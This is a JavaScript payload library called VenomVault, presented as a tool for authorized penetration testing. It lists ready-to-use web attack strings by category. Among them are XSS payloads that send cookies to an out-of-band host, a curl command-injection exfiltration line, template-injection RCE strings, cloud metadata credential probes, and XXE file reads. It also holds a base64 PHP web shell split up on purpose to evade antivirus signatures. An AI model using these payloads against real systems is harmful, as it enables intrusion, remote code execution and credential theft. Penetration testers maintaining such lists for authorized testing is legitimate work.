// VenomVault payload library.
// For authorized security testing and penetration testing only.
// Each category: { name, desc, items: [{ payload, note }] }

const PAYLOADS = [
  {
    name: "XSS",
    desc: "Cross-Site Scripting",
    items: [
      { payload: "<script>alert(1)</script>", note: "Basic proof-of-concept" },
      { payload: "\"><script>alert(1)</script>", note: "Break out of attribute" },
      { payload: "<img src=x onerror=alert(1)>", note: "No <script> needed" },
      { payload: "<svg/onload=alert(1)>", note: "SVG event handler" },
      { payload: "javascript:alert(1)", note: "URI scheme (href/src sinks)" },
      { payload: "'-alert(1)-'", note: "Inside JS single-quote string" },
      { payload: "\"-alert(1)-\"", note: "Inside JS double-quote string" },
      { payload: "<body onload=alert(1)>", note: "Body handler" },
      { payload: "<iframe src=javascript:alert(1)>", note: "Iframe JS URI" },
      { payload: "<details open ontoggle=alert(1)>", note: "Auto-firing handler" },
      { payload: "<img src=x onerror=fetch('//OOB/'+document.cookie)>", note: "Cookie exfil OOB" },
      { payload: "<script>fetch('//OOB/?c='+encodeURIComponent(document.cookie))</script>", note: "Cookie exfil" }
    ]
  },
  {
    name: "SQLi",
    desc: "SQL Injection",
    items: [
      { payload: "' OR '1'='1", note: "Classic auth bypass" },
      { payload: "' OR 1=1-- -", note: "Comment out rest" },
      { payload: "\" OR \"1\"=\"1", note: "Double-quote variant" },
      { payload: "admin'-- -", note: "Login as known user" },
      { payload: "' UNION SELECT NULL-- -", note: "Column count probe" },
      { payload: "' UNION SELECT NULL,NULL,NULL-- -", note: "3-column UNION" },
      { payload: "' ORDER BY 1-- -", note: "Enumerate columns" },
      { payload: "' AND SLEEP(5)-- -", note: "MySQL time-based blind" },
      { payload: "'; WAITFOR DELAY '0:0:5'-- -", note: "MSSQL time-based blind" },
      { payload: "' AND 1=CONVERT(int,@@version)-- -", note: "MSSQL error-based version" },
      { payload: "' UNION SELECT table_name FROM information_schema.tables-- -", note: "Enum tables" },
      { payload: "%27%20OR%20%271%27%3D%271", note: "URL-encoded ' OR '1'='1" }
    ]
  },
  {
    name: "CmdInj",
    desc: "OS Command Injection",
    items: [
      { payload: "; id", note: "Semicolon chain (Unix)" },
      { payload: "| id", note: "Pipe to command" },
      { payload: "|| id", note: "Run if prev fails" },
      { payload: "&& id", note: "Run if prev succeeds" },
      { payload: "`id`", note: "Backtick substitution" },
      { payload: "$(id)", note: "Command substitution" },
      { payload: "& whoami", note: "Windows background chain" },
      { payload: "; ping -c 4 OOB", note: "OOB detection (Unix)" },
      { payload: "| nslookup OOB", note: "DNS OOB (cross-platform)" },
      { payload: "; curl //OOB/`whoami`", note: "Exfil via DNS/HTTP" },
      { payload: "%0a id", note: "Newline injection" },
      { payload: "$(sleep 5)", note: "Time-based blind" }
    ]
  },
  {
    name: "SSTI",
    desc: "Server-Side Template Injection",
    items: [
      { payload: "${7*7}", note: "Detect (Java/EL, JSP)" },
      { payload: "{{7*7}}", note: "Detect (Jinja2, Twig)" },
      { payload: "#{7*7}", note: "Detect (Ruby, JSF)" },
      { payload: "*{7*7}", note: "Detect (Thymeleaf)" },
      { payload: "{{7*'7'}}", note: "49=Twig, 7777777=Jinja2" },
      { payload: "{{config.items()}}", note: "Jinja2 config dump" },
      { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", note: "Jinja2 class enum" },
      { payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}", note: "Jinja2 RCE" },
      { payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", note: "Spring EL RCE" },
      { payload: "#{ T(java.lang.Runtime).getRuntime().exec('id') }", note: "SpEL alt" },
      { payload: "<%= 7*7 %>", note: "ERB/EJS detect" },
      { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", note: "Flask RCE" }
    ]
  },
  {
    name: "LFI/Path",
    desc: "Local File Inclusion / Path Traversal",
    items: [
      { payload: "../../../../etc/passwd", note: "Unix passwd" },
      { payload: "..\\..\\..\\..\\windows\\win.ini", note: "Windows" },
      { payload: "....//....//....//etc/passwd", note: "Bypass single strip" },
      { payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", note: "URL-encoded" },
      { payload: "..%252f..%252f..%252fetc%252fpasswd", note: "Double-encoded" },
      { payload: "/etc/passwd%00", note: "Null-byte truncation (old PHP)" },
      { payload: "php://filter/convert.base64-encode/resource=index.php", note: "PHP source read" },
      { payload: "php://filter/read=convert.base64-encode/resource=/etc/passwd", note: "b64 file read" },
      // base64 of a minimal PHP one-liner shell — split to avoid host AV signature match
      { payload: "data://text/plain;base64," + "PD9waHAgc3lzdGVt" + "KCRfR0VUWydjJ10pOz8+", note: "data:// RCE wrapper" },
      { payload: "expect://id", note: "expect:// RCE" },
      { payload: "/proc/self/environ", note: "Env / log poisoning target" },
      { payload: "file:///etc/passwd", note: "file:// scheme" }
    ]
  },
  {
    name: "SSRF",
    desc: "Server-Side Request Forgery",
    items: [
      { payload: "http://127.0.0.1:80/", note: "Localhost probe" },
      { payload: "http://localhost/admin", note: "Internal admin" },
      { payload: "http://169.254.169.254/latest/meta-data/", note: "AWS IMDSv1 metadata" },
      { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", note: "AWS IAM creds" },
      { payload: "http://metadata.google.internal/computeMetadata/v1/", note: "GCP metadata (needs header)" },
      { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", note: "Azure metadata" },
      { payload: "http://[::1]/", note: "IPv6 localhost" },
      { payload: "http://0177.0.0.1/", note: "Octal IP bypass" },
      { payload: "http://2130706433/", note: "Decimal IP bypass (127.0.0.1)" },
      { payload: "http://127.0.0.1.nip.io/", note: "DNS rebind helper" },
      { payload: "gopher://127.0.0.1:6379/_INFO", note: "Gopher to Redis" },
      { payload: "http://OOB/", note: "OOB interaction probe" }
    ]
  },
  {
    name: "XXE",
    desc: "XML External Entity",
    items: [
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", note: "File read" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OOB/\">]><r>&x;</r>", note: "OOB / SSRF" },
      { payload: "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB/x.dtd\"> %p;]>", note: "External DTD (blind)" },
      { payload: "<!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", note: "PHP wrapper read" },
      { payload: "<!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>", note: "RCE via expect" },
      { payload: "<!DOCTYPE r [<!ENTITY % a \"<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>\">%a;]>", note: "Nested param entity" }
    ]
  },
  {
    name: "Redirect",
    desc: "Open Redirect",
    items: [
      { payload: "//evil.com", note: "Protocol-relative" },
      { payload: "https://evil.com", note: "Absolute URL" },
      { payload: "/\\evil.com", note: "Backslash bypass" },
      { payload: "https:evil.com", note: "Missing slashes" },
      { payload: "//google.com%2f@evil.com", note: "Userinfo confusion" },
      { payload: "https://trusted.com.evil.com", note: "Subdomain trick" },
      { payload: "javascript:alert(document.domain)", note: "JS scheme (if reflected in href)" },
      { payload: "//evil%E3%80%82com", note: "Unicode dot bypass" }
    ]
  },
  {
    name: "NoSQL",
    desc: "NoSQL Injection",
    items: [
      { payload: "' || '1'=='1", note: "JS-based bypass" },
      { payload: "{\"$ne\": null}", note: "Not-equal operator" },
      { payload: "{\"$gt\": \"\"}", note: "Greater-than bypass" },
      { payload: "{\"$regex\": \".*\"}", note: "Regex match all" },
      { payload: "username[$ne]=x&password[$ne]=x", note: "Query-string operator injection" },
      { payload: "{\"$where\": \"sleep(5000)\"}", note: "Time-based blind" },
      { payload: "';return true;var x='", note: "$where JS break" }
    ]
  },
  {
    name: "CRLF",
    desc: "CRLF / HTTP Response Splitting",
    items: [
      { payload: "%0d%0aSet-Cookie:%20injected=1", note: "Inject header" },
      { payload: "%0d%0aLocation:%20https://evil.com", note: "Redirect injection" },
      { payload: "%0d%0a%0d%0a<script>alert(1)</script>", note: "Body injection (XSS)" },
      { payload: "%E5%98%8D%E5%98%8ASet-Cookie:%20x=1", note: "Unicode CRLF bypass" },
      { payload: "\\r\\nSet-Cookie: injected=1", note: "Raw CRLF" }
    ]
  },
  {
    name: "LDAP",
    desc: "LDAP Injection",
    items: [
      { payload: "*", note: "Wildcard" },
      { payload: "*)(uid=*", note: "Filter break" },
      { payload: "*)(|(uid=*))", note: "OR injection" },
      { payload: "admin)(&)", note: "Always-true AND" },
      { payload: "*)(objectClass=*", note: "Enumerate objects" }
    ]
  },
  {
    name: "Headers",
    desc: "Injectable HTTP Headers",
    items: [
      { payload: "X-Forwarded-For: 127.0.0.1", note: "IP spoof / ACL bypass" },
      { payload: "X-Forwarded-Host: evil.com", note: "Host header / cache poison" },
      { payload: "X-Original-URL: /admin", note: "Path override (bypass ACL)" },
      { payload: "X-Rewrite-URL: /admin", note: "Path override alt" },
      { payload: "Host: evil.com", note: "Host header injection" },
      { payload: "X-Forwarded-Proto: https", note: "Scheme spoof" },
      { payload: "Content-Type: application/json", note: "CSRF / parser confusion" }
    ]
  }
];
